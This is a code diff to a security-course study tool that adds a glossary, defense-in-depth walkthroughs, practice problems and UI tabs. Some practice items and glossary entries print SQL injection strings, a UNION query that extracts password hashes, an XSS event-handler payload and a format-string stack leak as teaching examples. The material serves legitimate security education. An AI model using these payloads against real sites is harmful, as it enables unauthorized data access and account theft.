+          example: 'AES-NI gives ~5 GB/s per CPU core for AES-128-GCM on a modern Xeon; without AES-NI software AES is ~10× slower and timing-leakage-prone.',
+          pitfall: 'Enabling 0-RTT for non-idempotent POSTs allows replay attacks — restrict 0-RTT to idempotent GETs and bind to early-data anti-replay cache.' },
+        { title: '4. Parameterized queries + RLS', component: 'App → ORM → Postgres', detail: 'Every DB call uses parameter binding (no string concatenation); Postgres row-level security policies enforce tenant_id = current_setting(\'app.tenant\'), so a missed WHERE clause cannot leak cross-tenant data.', proto: 'libpq prepared statements + RLS',
+          intuition: 'Parameterization separates code (SQL grammar) from data (user input) at the protocol level — there is no string for the attacker to escape out of.',
+          example: 'The 2017 Equifax breach (~147M records) chained CVE-2017-5638 Apache Struts RCE; defense-in-depth (network segmentation + RLS) would have bounded blast radius dramatically.',
+          pitfall: 'Using an ORM but dropping to raw("SELECT … " + user_id) for a "quick fix" is the most common modern SQLi vector — block it with a CodeQL custom query.',
+          code: 'cur.execute("SELECT * FROM orders WHERE user_id=%s", (uid,))\nSET ROLE app; SELECT * FROM orders;  -- RLS filters automatically' },
+        { title: '5. CSP + SameSite + CSRF', component: 'Browser (response headers)', detail: 'Content-Security-Policy with nonces blocks inline-script XSS; Set-Cookie: SameSite=Strict + Secure + HttpOnly defeats CSRF and cookie theft; Trusted Types eliminate DOM-XSS sinks structurally.', proto: 'CSP L3 / SameSite / Trusted Types',
+          intuition: 'CSP transforms XSS from "any injected script runs" into "only scripts I signed with this nonce run" — a structural defense, not pattern matching.',
+          example: 'Google rolled out Trusted Types across ~all internal apps and reported a 95%+ reduction in DOM-XSS reports; HSTS preload is shipped in every major browser.',
+          pitfall: 'CSP with unsafe-inline as a "transition" gives an effective CSP of "anything goes" — use nonces or strict-dynamic, never unsafe-inline.' },
+        { title: '6. Memory-safe runtime', component: 'Rust/Go service + ASLR/CFI', detail: 'Process compiled with stack canaries, position-independent code, full RELRO, and Control-Flow Integrity. Even if a C dependency has UAF, ASLR (~28–30 bits user-space entropy on Linux x86-64) makes exploitation probabilistic.', proto: 'Clang -fstack-protector-strong -fcf-protection -fPIE',
+          intuition: 'Memory-safe languages remove ~70% of historic CVEs (Microsoft and Chrome both report this number); for the remaining C/C++, mitigations turn deterministic exploits into probabilistic ones.',
+          example: 'Linux x86-64 mmap base randomization gives 28 bits of entropy by default (CONFIG_ARCH_MMAP_RND_BITS); kernel base randomization (KASLR) typically adds 9–16 bits.',
+          pitfall: 'Spectre/Meltdown-class side-channels leak at ~1–10 KB/s past these defenses — speculation barriers (LFENCE / retpoline) are needed at trust boundaries.' },
+        { title: '7. Audit log → SIEM → on-call', component: 'Structured JSON logs → Splunk/Sentinel', detail: 'Every auth decision, DB write, and admin action emits a structured event with actor, tenant, and request_id. SIEM detection rules (Sigma) fire on anomalies — impossible-travel, sudden privilege escalation, mass export.', proto: 'OpenTelemetry + Sigma rules',
+          intuition: 'You cannot stop every intrusion; you can dramatically shorten the dwell time, which is the variable that converts a "breach" into a "near miss."',
+          example: 'Mandiant M-Trends 2024: global median dwell time fell to 10 days (from 416 in 2011) — orgs with mature SIEM detection median ~5 days vs ~100+ without.',
+          pitfall: 'Logging without retention or without an alerting layer = expensive write-only storage; tie every detection rule to a paged on-call runbook.' }
+      ]
+    }
+  ],
+
+  // === BEGIN glossary v1 data placeholder ===
+  glossary: [
+    {
+      id: 'tcb', term: 'Trusted Computing Base', aka: 'TCB', category: 'concepts',
+      short: 'The minimal set of hardware/software/firmware that must be correct for security to hold.',
+      long: 'If any TCB component is buggy or compromised, security guarantees evaporate. Good designs minimize the TCB — a small kernel + verified bootloader is auditable; a 50M-LOC OS is not. Saltzer & Schroeder’s "economy of mechanism" principle directly motivates a small TCB.',
+      seeAlso: ['shannons', 'sop']
+    },
+    {
+      id: 'shannons', term: "Shannon's Maxim", aka: 'Kerckhoffs’s principle', category: 'concepts',
+      short: 'The enemy knows the system — security must not depend on design secrecy, only on key secrecy.',
+      long: 'Cryptosystems should remain secure even if everything except the key is public. This is why peer-reviewed standards (AES, TLS) beat proprietary "secret" algorithms, and why obscurity is at best a delay tactic, never a primitive.',
+      seeAlso: ['aes', 'tls']
+    },
+    {
+      id: 'threat-model', term: 'Threat Model', aka: 'STRIDE', category: 'concepts',
+      short: 'Structured enumeration of attackers, assets, and attack surfaces before designing defenses.',
+      long: 'Microsoft’s STRIDE (Spoofing, Tampering, Repudiation, Info-disclosure, DoS, Elevation) is a common taxonomy. Without a threat model you can’t tell which defenses are necessary, sufficient, or wasted — e.g., TLS is useless against a malicious insider with DB access.',
+      seeAlso: ['tcb', 'zero-trust']
+    },
+    {
+      id: 'zero-trust', term: 'Zero Trust', aka: 'BeyondCorp', category: 'concepts',
+      short: 'Never trust the network — authenticate and authorize every request, even inside the perimeter.',
+      long: 'Replaces the castle-and-moat model. Every service-to-service call presents a cryptographic identity (mTLS, SPIFFE) and is authorized per request. Eliminates lateral movement after a breach: stealing a VPN cred no longer unlocks the data plane.',
+      seeAlso: ['tls', 'certs', 'firewall']
+    },
+    {
+      id: 'bufoverflow', term: 'Buffer Overflow', aka: 'stack smashing', category: 'software',
+      short: 'Writing past a buffer boundary, corrupting adjacent memory like saved return addresses.',
+      long: 'On x86-64, overrunning char buf[64] by 72 bytes overwrites the saved RIP, redirecting control flow. The canonical 1996 Aleph One paper "Smashing the Stack for Fun and Profit" weaponized this. Modern mitigations are canaries, W⊕X, and ASLR — not fixes, but cost multipliers.',
+      seeAlso: ['canaries', 'aslr', 'wx', 'rop']
+    },
+    {
+      id: 'rop', term: 'Return-Oriented Programming', aka: 'ROP', category: 'software',
+      short: 'Chain existing code "gadgets" ending in ret to compute arbitrarily, bypassing W⊕X.',
+      long: 'Since the attacker cannot inject new executable code under W⊕X, they reuse fragments of existing code (libc, the binary). Each gadget ends in `ret`, popping the next address from a controlled stack. Defeated in principle by CFI and shadow stacks; in practice by ASLR raising the bar.',
+      seeAlso: ['wx', 'aslr', 'bufoverflow']
+    },
+    {
+      id: 'aslr', term: 'ASLR', aka: 'Address Space Layout Randomization', category: 'software',
+      short: 'Randomize stack, heap, and library base addresses each run so attackers can’t hardcode targets.',
+      long: 'Forces attackers to first leak an address (info disclosure) before any ROP chain works. Entropy matters: 32-bit ASLR has only ~16 bits of randomness and is brute-forceable; 64-bit gives ~28+ bits. Combine with PIE (position-independent executables) for full coverage.',
+      seeAlso: ['rop', 'wx', 'canaries']
+    },
+    {
+      id: 'canaries', term: 'Stack Canaries', aka: 'StackGuard, -fstack-protector', category: 'software',
+      short: 'Random sentinel placed before saved RIP; checked on return to detect contiguous overflows.',
+      long: 'GCC’s -fstack-protector-strong inserts a per-thread random word; if it changes, `__stack_chk_fail` aborts. Cheap and effective against linear overflows, but useless against arbitrary writes, format-string leaks of the canary itself, or non-contiguous corruption.',
+      seeAlso: ['bufoverflow', 'aslr', 'wx']
+    },
+    {
+      id: 'wx', term: 'W⊕X', aka: 'DEP, NX bit', category: 'software',
+      short: 'Memory pages are either writable or executable, never both — blocks injected shellcode.',
+      long: 'Enforced via the NX (no-execute) bit on page table entries. Killed classic "jump to shellcode on the stack" attacks circa 2004, forcing attackers to invent ROP. JIT engines need careful W→X transitions to stay safe.',
+      seeAlso: ['rop', 'bufoverflow', 'aslr']
+    },
+    {
+      id: 'aes', term: 'AES', aka: 'Rijndael, Advanced Encryption Standard', category: 'numerics',
+      short: 'NIST-standardized 128-bit block cipher with 128/192/256-bit keys; the workhorse of symmetric crypto.',
+      long: 'Substitution-permutation network with 10/12/14 rounds. Hardware-accelerated via AES-NI on every modern CPU (~1 cycle/byte). Never use raw AES-ECB (leaks patterns); always with an AEAD mode like GCM or a properly-IV’d CBC + HMAC.',
+      seeAlso: ['aead', 'hash', 'tls']
+    },
+    {
+      id: 'aead', term: 'Authenticated Encryption', aka: 'AES-GCM, ChaCha20-Poly1305', category: 'numerics',
+      short: 'Combined confidentiality + integrity + authenticity in one primitive — the modern default.',
+      long: 'AES-GCM = AES-CTR encryption + GHASH MAC. Nonce reuse is catastrophic: two messages with the same (key, nonce) leak the XOR of plaintexts and the GHASH authentication key, enabling forgeries. Use random 96-bit nonces or a counter, never reuse.',
+      seeAlso: ['aes', 'mac', 'tls']
+    },
+    {
+      id: 'hash', term: 'Cryptographic Hash', aka: 'SHA-256, SHA-3', category: 'numerics',
+      short: 'One-way function with collision and preimage resistance; fingerprints data of any size.',
+      long: 'SHA-256 outputs 256 bits; finding a collision costs ~2¹²⁸ work (birthday bound). MD5 and SHA-1 are broken for collision resistance and must not be used for signatures. Hashes alone are not MACs — append a key first (HMAC) or you’re vulnerable to length-extension.',
+      seeAlso: ['mac', 'signatures', 'passwords']
+    },
+    {
+      id: 'mac', term: 'Message Authentication Code', aka: 'HMAC', category: 'numerics',
+      short: 'Symmetric tag proving a message came from someone holding the shared key and was not modified.',
+      long: 'HMAC(K, m) = H((K⊕opad) ∥ H((K⊕ipad) ∥ m)) — the double-hash construction defeats length-extension. Always compare tags in constant time (`hmac.compare_digest`) to block timing attacks. MAC-then-encrypt is fragile (padding oracles); Encrypt-then-MAC or AEAD is safe.',
+      seeAlso: ['hash', 'aead', 'signatures']
+    },
+    {
+      id: 'signatures', term: 'Digital Signature', aka: 'RSA-PSS, ECDSA, Ed25519', category: 'numerics',
+      short: 'Asymmetric tag: only the private-key holder can produce it, anyone with the public key can verify.',
+      long: 'Provides authenticity + integrity + non-repudiation (unlike MACs). Sign the hash, not the message, for arbitrary length. ECDSA requires per-signature random nonces — reusing one leaks the private key (Sony PS3, 2010). Ed25519 is deterministic and avoids that footgun.',
+      seeAlso: ['hash', 'certs', 'dh']
+    },
+    {
+      id: 'rsa', term: 'RSA', aka: 'Rivest–Shamir–Adleman', category: 'numerics',
+      short: 'Asymmetric crypto based on the hardness of factoring n = p·q for 2048+ bit primes.',
+      long: 'Encrypt: c = m^e mod n; sign: s = m^d mod n. Textbook RSA is insecure — always use OAEP padding for encryption and PSS for signatures. Quantum-vulnerable: Shor’s algorithm breaks it in polynomial time, motivating post-quantum migration.',
+      seeAlso: ['dh', 'signatures', 'certs']
+    },
+    {
+      id: 'dh', term: 'Diffie–Hellman', aka: 'DHE, ECDHE', category: 'numerics',
+      short: 'Two parties derive a shared secret over a public channel; no prior key needed.',
+      long: 'Alice sends g^a, Bob sends g^b, both compute g^ab. Security rests on the Discrete Log Problem. Static DH gives no forward secrecy — use ephemeral (DHE/ECDHE) so a server-key compromise tomorrow doesn’t decrypt today’s traffic. Curve25519 is the modern default.',
+      seeAlso: ['rsa', 'tls', 'signatures']
+    },
+    {
+      id: 'certs', term: 'X.509 Certificate', aka: 'PKI', category: 'numerics',
+      short: 'Signed binding of a public key to an identity (domain, person) by a trusted CA.',
+      long: 'Browsers ship a root store (~150 CAs); any CA can issue for any domain, so a single compromise (DigiNotar 2011) breaks the world. Certificate Transparency logs and CAA records mitigate. Always pin or expect-CT for high-value endpoints.',
+      seeAlso: ['tls', 'signatures', 'zero-trust']
+    },
+    {
+      id: 'passwords', term: 'Password Hashing', aka: 'Argon2id, bcrypt, scrypt', category: 'numerics',
+      short: 'Slow, salted, memory-hard hashing so a stolen DB resists GPU/ASIC brute force.',
+      long: 'Never store plaintext; never use SHA-256 directly (a 4090 does ~50 GH/s). Argon2id with m=64 MiB, t=3, p=4 is OWASP-recommended. Add a 16-byte random salt per user and optionally a server-side pepper in an HSM. Rehash on login when parameters increase.',
+      seeAlso: ['hash', 'hsm', 'mac']
+    },
+    {
+      id: 'tls', term: 'TLS', aka: 'Transport Layer Security, SSL', category: 'systems',
+      short: 'Encrypted + authenticated channel between client and server, built on certs + AEAD + (EC)DHE.',
+      long: 'TLS 1.3 (RFC 8446) cut the handshake to 1-RTT, removed RSA key exchange (no PFS), and banned every cipher with a footgun history (CBC, RC4, MD5). The handshake binds an (EC)DHE shared secret to the server certificate; the record layer encrypts with AES-GCM or ChaCha20-Poly1305.',
+      seeAlso: ['certs', 'dh', 'aead', 'zero-trust']
+    },
+    {
+      id: 'sqli', term: 'SQL Injection', aka: 'SQLi', category: 'systems',
+      short: 'User input concatenated into a query lets attackers smuggle SQL commands.',
+      long: 'Classic: `"… WHERE name=\'" + input + "\'"` with input `\' OR 1=1 --` returns all rows. Fix is parameterized queries (prepared statements) — the driver sends SQL and data over separate channels so user input cannot become code. ORMs help but raw .query() resurfaces the bug.',
+      seeAlso: ['sanitize', 'xss', 'csrf']
+    },
+    {
+      id: 'xss', term: 'Cross-Site Scripting', aka: 'XSS', category: 'systems',
+      short: 'Attacker-controlled JavaScript runs in a victim’s browser under the victim site’s origin.',
+      long: 'Three flavors: stored (persisted in DB), reflected (echoed in URL), DOM-based (client-side sink). Defenses: contextual output encoding (HTML, JS, URL each differ), a strict Content-Security-Policy that bans inline scripts, and HttpOnly cookies so JS can’t exfiltrate sessions.',
+      seeAlso: ['csp', 'sop', 'sanitize', 'cookies']
+    },
+    {
+      id: 'csrf', term: 'Cross-Site Request Forgery', aka: 'CSRF, XSRF', category: 'systems',
+      short: 'Malicious site forces a logged-in user’s browser to send an authenticated request to a target.',
+      long: 'Browsers auto-attach cookies to requests regardless of origin. Defenses: SameSite=Lax/Strict cookies (now default), CSRF tokens bound to the session, and double-submit cookies. Pure JSON APIs requiring custom headers benefit from the simple-request CORS rule blocking cross-origin sends.',
+      seeAlso: ['sop', 'cookies', 'xss']
+    },
+    {
+      id: 'sop', term: 'Same-Origin Policy', aka: 'SOP', category: 'systems',
+      short: 'Browsers isolate scripts by (scheme, host, port) — script from A.com can’t read B.com.',
+      long: 'The bedrock of web security. CORS is the controlled relaxation (server opts in to cross-origin reads). Bypasses are usually bugs (postMessage misuse, JSONP relics, dangling DNS). XSS pierces SOP by running attacker code *as* the target origin.',
+      seeAlso: ['xss', 'csp', 'cookies']
+    },
+    {
+      id: 'csp', term: 'Content Security Policy', aka: 'CSP', category: 'systems',
+      short: 'HTTP header restricting which sources of script/style/img/etc. the browser will load.',
+      long: '`Content-Security-Policy: default-src \'self\'; script-src \'self\' \'nonce-xyz\'` blocks inline `<script>` and third-party JS — neutering most XSS even when the underlying bug exists. Report-only mode + a reporting endpoint lets you ship a strict policy without breaking the site.',
+      seeAlso: ['xss', 'sop', 'sanitize']
+    },
+    {
+      id: 'dns', term: 'DNS', aka: 'Domain Name System', category: 'systems',
+      short: 'Name-to-IP resolution; plaintext by default and trivially spoofable on a hostile network.',
+      long: 'Kaminsky (2008) showed cache poisoning via predictable transaction IDs. DNSSEC adds signatures along the delegation chain but adoption is patchy. DoH/DoT encrypt the client↔resolver hop, hiding lookups from the local network but not from the resolver itself.',
+      seeAlso: ['dnssec', 'tls', 'tcp']
+    },
+    {
+      id: 'firewall', term: 'Firewall', aka: 'packet filter', category: 'systems',
+      short: 'Policy enforcement on packets: stateless rules on 5-tuples, or stateful flow tracking.',
+      long: 'Default-deny ingress is table stakes; default-deny egress catches data exfiltration and C2 callbacks. Network firewalls don’t replace app-layer authz — a permitted TCP/443 flow still carries SQLi. WAFs operate one layer up on HTTP semantics.',
+      seeAlso: ['ids', 'tcp', 'dos', 'zero-trust']
+    },
+    {
+      id: 'dos', term: 'Denial of Service', aka: 'DoS / DDoS', category: 'systems',
+      short: 'Exhaust a target’s CPU, memory, bandwidth, or connection table so legitimate users can’t use it.',
+      long: 'Amplification (DNS, NTP, memcached) turns one spoofed UDP byte into hundreds. SYN floods exhaust half-open connection slots — SYN cookies fix this. Application-layer DoS (slowloris, expensive endpoints) defeats network-level mitigation; rate limiting and proof-of-work tokens help.',
+      seeAlso: ['tcp', 'firewall', 'ids']
+    },
+    {
+      id: 'hsm', term: 'Hardware Security Module', aka: 'HSM, TPM, secure enclave', category: 'hardware',
+      short: 'Tamper-resistant chip that generates and uses keys without ever exposing them to host RAM.',
+      long: 'Private keys live in the HSM; the host requests sign/decrypt operations over a controlled API. FIPS 140-2/3 levels grade physical resistance. Cloud KMS (AWS KMS, GCP Cloud HSM) provides the same property as a service — compromise of the application doesn’t leak the key.',
+      seeAlso: ['certs', 'signatures', 'passwords']
+    },
+    {
+      id: 'side-channel', term: 'Side Channel', aka: 'timing/cache/power attack', category: 'performance',
+      short: 'Leak secrets through non-functional behavior: time, cache state, power, EM emissions.',
+      long: 'Data-dependent branches or memory accesses turn into observable timing differences (Lucky13, Spectre). Mitigations: constant-time code (no secret-dependent branches, no secret-indexed loads), `subtle::ConstantTimeEq`, and disabling SMT on multi-tenant hosts. Test with dudect/ctgrind.',
+      seeAlso: ['aead', 'mac', 'passwords']
+    },
+    {
+      id: 'sanitize', term: 'Input Sanitization', aka: 'output encoding', category: 'software',
+      short: 'Neutralize dangerous content at the right boundary — usually output encoding, not input filtering.',
+      long: 'Blocklists fail (encodings, Unicode tricks); allowlists and context-aware encoders win. HTML context: escape `<>&"\'`. JS string context: escape differently. SQL: don’t sanitize — parameterize. Use library encoders (DOMPurify, OWASP Java Encoder), never hand-rolled regex.',
+      seeAlso: ['xss', 'sqli', 'csp']
+    }
+  ],
+  // === END glossary v1 data placeholder ===
+
+  problems: [
+    {
+      week: 'Week 1-2', title: 'Threat Modeling & First Principles',
+      items: [
+        { tag: 'design', text: 'Design a threat model for a campus print server using STRIDE. List one concrete threat per category (Spoofing, Tampering, Repudiation, Information disclosure, DoS, Elevation of privilege) and a matched mitigation. Which two are easiest to forget and why?', hint: 'Repudiation and Information disclosure are the most under-modeled — think about logging and side channels.' },
+        { tag: 'paper', text: 'Saltzer & Schroeder list 8 design principles. Pick "Economy of mechanism" and "Complete mediation" and argue, in 200 words, which is harder to retrofit into an existing 1M-LOC web app and why.', hint: 'Reference monitors require interposition on every access — usually a syscall/middleware retrofit.' },
+        { tag: 'debug', text: 'A startup ships a feature-flag service where each microservice fetches "isEnabled" over HTTP without authentication on the internal VPC. List three failure modes a zero-trust review would flag in 5 minutes.', hint: 'East-west traffic, lateral movement, missing authn between services.' }
+      ]
+    },
+    {
+      week: 'Week 3-5', title: 'Memory Safety & Exploitation',
+      items: [
+        { tag: 'derive', text: 'Given char buf[64]; on x86-64 with frame layout [buf | saved RBP (8 B) | RIP (8 B)], compute the exact byte offset at which an attacker must place the address of a one_gadget to redirect control flow. Show the math.', hint: 'Offset = sizeof(buf) + sizeof(SFP) = 64 + 8 = 72; bytes 72..79 overwrite RIP.' },
+        { tag: 'code', text: 'Write a 10-line C program that demonstrates a format-string read primitive (leaking a stack canary via printf(user_input)). Then rewrite it safely. Why does -Wformat-security catch the bug?', hint: 'printf("%p %p %p %p") with user-controlled format string walks the stack; safe form passes "%s" as the format and the user string as an argument.' },
+        { tag: 'design', text: 'You are given a legacy C codebase. Rank the following mitigations by effort-vs-impact: stack canaries, ASLR, CFI (Clang Control-Flow Integrity), rewriting in Rust. Justify your ordering for a 6-month budget.', hint: 'Canaries/ASLR are compile-flag wins; CFI needs whole-program; Rust is years.' },
+        { tag: 'debug', text: 'A Heartbleed-style read-past-buffer leaks 64 KB per request. A junior engineer "fixes" it by zeroing the response buffer before reuse. Is that sufficient? What still leaks?', hint: 'Memory still contains adjacent heap data — the bug is the missing length check, not stale buffers.' }
+      ]
+    },
+    {
+      week: 'Week 6-8', title: 'Cryptography',
+      items: [
+        { tag: 'derive', text: 'Show that reusing a 96-bit GCM nonce N with key K to encrypt two messages (P₁, P₂) leaks P₁ ⊕ P₂. Then explain why an attacker who recovers H = AES_K(0¹²⁸) can also forge ciphertexts.', hint: 'Both ciphertexts share the same keystream from CTR(N); GHASH is linear in H over GF(2¹²⁸).' },
+        { tag: 'code', text: 'Implement Diffie-Hellman in 15 lines of Python over the RFC 3526 2048-bit MODP group. Explain why you must NOT use g=2 with p=23 in production, even though the math works identically.', hint: 'Small p has only ~5 bits of security; need ≥2048-bit p with safe-prime structure.' },
+        { tag: 'paper', text: 'Read the abstract of Bleichenbacher (1998) "Chosen Ciphertext Attacks Against Protocols Based on the RSA Encryption Standard PKCS #1". Explain in 3 sentences why a server response of "bad padding" vs "bad MAC" is an oracle, and how TLS 1.3 fixes it.', hint: 'TLS 1.3 removes RSA key exchange entirely in favor of (EC)DHE.' },
+        { tag: 'design', text: 'Design a password-storage scheme for 100M users that survives a full DB dump. List your KDF, parameters, salt size, pepper strategy, and how you migrate users when you raise parameters next year.', hint: 'Argon2id (m=64MiB, t=3, p=4) + 16B salt + HSM pepper + rehash-on-login.' },
+        { tag: 'debug', text: 'A team uses AES-CBC + HMAC-SHA256 in MAC-then-encrypt order. Why is this dangerous? Give one concrete attack name.', hint: 'Padding oracles (e.g., Lucky13, POODLE-like). Encrypt-then-MAC is the safe order; better still, AEAD.' }
+      ]
+    },
+    {
+      week: 'Week 9-10', title: 'Web Security',
+      items: [
+        { tag: 'code', text: 'Given the Flask snippet `cur.execute("SELECT * FROM users WHERE name=\'" + name + "\'")`, write the SQLi payload that returns all rows AND a payload that exfiltrates the password hash via UNION. Then rewrite the query to be safe.', hint: 'Payload: `\' OR \'1\'=\'1`; UNION: `\' UNION SELECT pw,NULL,NULL FROM users--`; safe form: cur.execute("... WHERE name=%s", (name,)).' },
+        { tag: 'design', text: 'Design a CSP for a SPA that loads its bundle from a CDN, talks to a single API origin, and embeds Stripe.js. Write the Content-Security-Policy header and explain each directive.', hint: 'default-src \'none\'; script-src \'self\' https://cdn.example https://js.stripe.com \'nonce-XYZ\'; connect-src https://api.example; frame-src https://js.stripe.com; base-uri \'none\';' },
+        { tag: 'debug', text: 'A site is vulnerable to CSRF on /transfer. The team adds a SameSite=Lax cookie. Explain in which scenarios this is sufficient and in which it is not (think GET vs POST, top-level navigation, iframes).', hint: 'Lax sends the cookie on top-level GETs; if /transfer accepts GET, you are still exposed. Use SameSite=Strict or a CSRF token + POST-only.' },
+        { tag: 'paper', text: 'Compare reflected vs stored vs DOM-based XSS in a 1-paragraph table: where the payload lives, who triggers it, and which defense (CSP nonces, contextual escaping, Trusted Types) is most effective.', hint: 'Trusted Types is the only one that catches DOM-based XSS at runtime.' }
+      ]
+    },
+    {
+      week: 'Week 11-13', title: 'Network & Systems Security',
+      items: [
+        { tag: 'design', text: 'Design DNS resolution for a sensitive enterprise that wants to defeat both passive surveillance and DNS-spoofing. Specify the protocol stack and why each layer is needed.', hint: 'DoH/DoT to a trusted resolver (confidentiality) + DNSSEC validation (integrity) + QNAME minimization (metadata).' },
+        { tag: 'derive', text: 'A SYN-flood attack sends 200k spoofed SYN/sec to a server. Each half-open connection consumes 304 bytes. How long until a 1 GB SYN backlog table is exhausted? What does SYN-cookies change about this calculation?', hint: '1 GB / (304 B × 200k/s) ≈ 17 s. SYN-cookies make state O(1) — no table to exhaust.' },
+        { tag: 'debug', text: 'A red-teamer claims they can MITM your TLS by injecting a rogue CA into the OS trust store. List three independent defenses that detect this even after CA compromise.', hint: 'Certificate pinning, Certificate Transparency log monitoring, HPKP (deprecated) / Expect-CT, DANE.' },
+        { tag: 'paper', text: 'Skim the EternalBlue (CVE-2017-0144) advisory. In 3 bullets, explain (a) the vulnerable code path in srv.sys, (b) why W⊕X did not save the kernel, (c) what a defender could have done in March 2017 before the WannaCry outbreak.', hint: 'Pool corruption in SMBv1 → kernel R/W; W⊕X applies but kernel pool was RWX historically; MS17-010 patch was available a month before the worm.' }
       ]
     }
   ],
@@ -1357,7 +2341,9 @@ if (C.graph && C.graph.nodes && C.graph.nodes.length) tabs.push({ id: 'graph',  
 if (C.deepDives && C.deepDives.length)  tabs.push({ id: 'deepdive', label: '📚 Deep Dives' });
 if (C.useCases && C.useCases.length)    tabs.push({ id: 'usecase',  label: '🔬 Use Cases' });
 if (C.youtube && C.youtube.videos && C.youtube.videos.length) tabs.push({ id: 'appendix', label: '📹 Appendix' });
+if (C.glossary && C.glossary.length)    tabs.push({ id: 'glossary', label: '📖 Glossary' }); /* glossary v1 tab */
 tabs.push({ id: 'problems', label: '🧠 Practice' });
+tabs.push({ id: 'quiz',     label: '🎯 Quiz' });
 
 document.getElementById('toolbar-title').textContent = '🧠 ' + C.course.code;
 document.title = C.course.code + ' — Interactive Study Tool';
@@ -1673,6 +2659,7 @@ function initGraph() {
   // Nodes
   const node = gGraph.selectAll("g.graph-node").data(nodes).enter().append("g")
     .attr("class", "graph-node")
+    .attr("data-id", d => d.id) /* glossary v1 data-id */
     .call(d3.drag().on("start", (evt, d) => { if (!evt.active) simul.alphaTarget(0.3).restart(); d.fx = d.x; d.fy = d.y; })
       .on("drag", (evt, d) => { d.fx = evt.x; d.fy = evt.y; })
       .on("end", (evt, d) => { if (!evt.active) simul.alphaTarget(0); d.fx = null; d.fy = null; }))
@@ -2004,6 +2991,8 @@ if (C.deepDives && C.deepDives.length) {
     // Full view
     const full = document.createElement('div'); full.className = 'dd-full'; full.id = 'dd-full-' + dd.id;
     let fhtml = `<div class="dd-infographic"><h2 style="color:${dd.color}">${dd.icon || ''} ${dd.title}</h2><div class="dd-subtitle">${dd.num} · ${dd.desc}</div>`;
+    // Navigator at the top for quick prev/grid/next without scrolling
+    fhtml += `<div class="dd-nav dd-nav-top"><button class="btn" onclick="navDD(-1)">← Prev</button><button class="btn" onclick="showCardGrid()">Grid</button><button class="btn" onclick="navDD(1)">Next →</button></div>`;
     if (dd.svg) fhtml += dd.svg(800, 300);
     (dd.sections || []).forEach(s => {
       fhtml += `<div class="dd-section"><h3>${s.title}</h3>`;
@@ -2016,7 +3005,7 @@ if (C.deepDives && C.deepDives.length) {
       dd.keypoints.forEach(kp => { fhtml += `<div class="dd-kp"><strong>${kp.title}</strong><span>${kp.text}</span></div>`; });
       fhtml += '</div>';
     }
-    fhtml += `<div class="dd-nav"><button class="btn" onclick="navDD(-1)">← Prev</button><button class="btn" onclick="showCardGrid()">Grid</button><button class="btn" onclick="navDD(1)">Next →</button></div></div>`;
+    fhtml += `</div>`; // dd-nav v1 top inserted
     full.innerHTML = fhtml;
     fullContainer.appendChild(full);
   });
@@ -2084,6 +3073,20 @@ function showUseCase(idx) {
   html += '<button class="uc-back-btn" onclick="showUseCaseGrid()">← Back to All Use Cases</button>';
   html += `<h2>${uc.icon} ${uc.title}</h2>`;
   html += `<div class="uc-subtitle">${uc.desc}</div>`;
+  if (uc.summary || uc.pipeline || uc.metrics || uc.extensions) {
+    html += '<div class="uc-overview">';
+    if (uc.summary)   html += `<div class="uc-summary">${uc.summary}</div>`;
+    if (uc.pipeline)  html += `<div class="uc-pipeline">${uc.pipeline}</div>`;
+    if (uc.metrics && uc.metrics.length) {
+      html += '<div class="uc-metrics">';
+      uc.metrics.forEach(m => {
+        html += `<div class="uc-metric"><div class="uc-metric-label">${m.label}</div><div class="uc-metric-value">${m.value}</div></div>`;
+      });
+      html += '</div>';
+    }
+    if (uc.extensions) html += `<div class="uc-extensions"><strong>Where to go next:</strong> ${uc.extensions}</div>`;
+    html += '</div>';
+  }
   html += '<div class="uc-flow-controls">';
   html += '<button onclick="ucPrev()">← Previous</button>';
   html += '<button class="primary" onclick="ucNext()">Next Step →</button>';
@@ -2104,8 +3107,14 @@ function showUseCase(idx) {
     html += '<div class="uc-body">';
     html += `<div class="uc-title">${step.title}</div>`;
     html += `<div class="uc-component">📍 ${step.component}</div>`;
-    let detailHtml = `<p>${step.detail}</p><span class="uc-proto">${step.proto}</span>`;
+    let detailHtml = '';
+    if (step.intuition) detailHtml += `<div class="uc-intuition"><strong>💡 Intuition:</strong> ${step.intuition}</div>`;
+    detailHtml += `<p>${step.detail}</p>`;
+    if (step.proto) detailHtml += `<span class="uc-proto">${step.proto}</span>`;
+    if (step.complexity) detailHtml += `<span class="uc-complexity">⏱ ${step.complexity}</span>`;
     if (step.code) detailHtml += `<pre class="uc-code">${step.code}</pre>`;
+    if (step.example) detailHtml += `<div class="uc-example"><strong>📊 In practice:</strong> ${step.example}</div>`;
+    if (step.pitfall) detailHtml += `<div class="uc-pitfall"><strong>⚠ Pitfall:</strong> ${step.pitfall}</div>`;
     if (step.refs && step.refs.length) {
       detailHtml += '<div class="uc-refs">' + step.refs.map(r => `<a href="${r.url}" target="_blank" rel="noopener">${r.label}</a>`).join('') + '</div>';
     }
@@ -2372,10 +3381,48 @@ function toggleUnit(headerRow) {
 
 // PWA service worker removed (sw.js excluded from move)
 
-window.PROBLEMS_DATA=[{week:'Cryptography',title:'Symmetric & Public-Key',items:[{tag:'debug',text:'Alice encrypts the same message M twice with AES-CBC using the same key but different random IVs. What does an attacker learn? What if same IV is reused?',hint:'IV reuse in CBC leaks M1 XOR M2.'},{tag:'design',text:'Build a password-reset flow for a web app. What is stored server-side? What does the reset email contain? How long is the token valid? Draw the threat model.'},{tag:'derive',text:'RSA: given n=pq and phi=(p-1)(q-1), prove that `m^(ed) ≡ m (mod n)` when `ed ≡ 1 (mod phi)`. Use Fermat-Euler.'}]},{week:'Web & Systems',title:'XSS, CSRF, SQLi, Auth',items:[{tag:'debug',text:'A site escapes `<` and `>` but not quotes. Find an XSS payload using only unquoted-attribute context.',hint:'`onerror=alert(1)` after an `src=` with no quotes.'},{tag:'design',text:'Design a rate-limit defense against credential stuffing. What counter key? Where do you leak info if you reject vs drop vs delay?'}]},{week:'Network Security',title:'TLS, DNS, Firewalls',items:[{tag:'derive',text:'Why does TLS 1.3 drop RSA key-exchange in favor of (EC)DHE-only? What property does forward secrecy guarantee, and what does RSA-KE lose?'}]}];
+window.PROBLEMS_DATA=[
+{week:'Foundations',title:'Security Mindset & Threat Models',hook:"Defense-in-depth is the last resort — a tax you pay because every other layer might fail. The first move is always to shrink the TCB.",items:[
+  {tag:'design',star:true,text:'Sketch a threat model for a campus dorm vending machine that takes a student ID. Who are the attackers (insider student, lab-mate, vendor, custodian)? What are their capabilities and goals? Where does the trust boundary actually live — the card, the reader, the network, the back-end?',hint:'Trust ends at the silicon you physically control. Everything past the card reader is hostile.'},
